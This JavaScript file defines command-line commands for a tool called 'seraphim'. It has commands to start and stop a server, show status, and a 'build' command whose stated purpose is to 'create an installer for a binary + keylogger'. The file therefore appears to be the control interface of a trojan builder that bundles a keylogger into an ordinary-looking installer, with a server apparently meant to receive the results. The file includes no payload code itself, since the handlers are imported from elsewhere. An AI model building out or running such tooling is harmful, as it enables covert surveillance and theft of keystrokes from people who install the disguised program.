import {buildCommandHandler, serverDownHandler, serverUpHandler, showStatusHandler} from "./utils.js";

export function addServerCommand(program) {
    const serverCmd =
        program
            .command('server')
            .description("Manage the server");

    serverCmd
        .command('up')
        .summary('start a server')
        .option("--port -p <string>", "port to bind the server", "3000")
        .option("--force", "forces to create the server")
        .action(serverUpHandler);

    serverCmd
        .command('down')
        .summary('stop a server')
        .action(serverDownHandler);
}
export function addStatusCommand(program) {
    const statusCmd =
        program
            .command('status')
            .summary("Summarize seraphim status")
            .action(showStatusHandler);
}
export function addBuildCommand(program) {
    const build =
        program
            .command('build')
            .argument('<string>', 'path to the binary folder')
            .summary("create an installer for a binary + keylogger")
            .action(buildCommandHandler)

}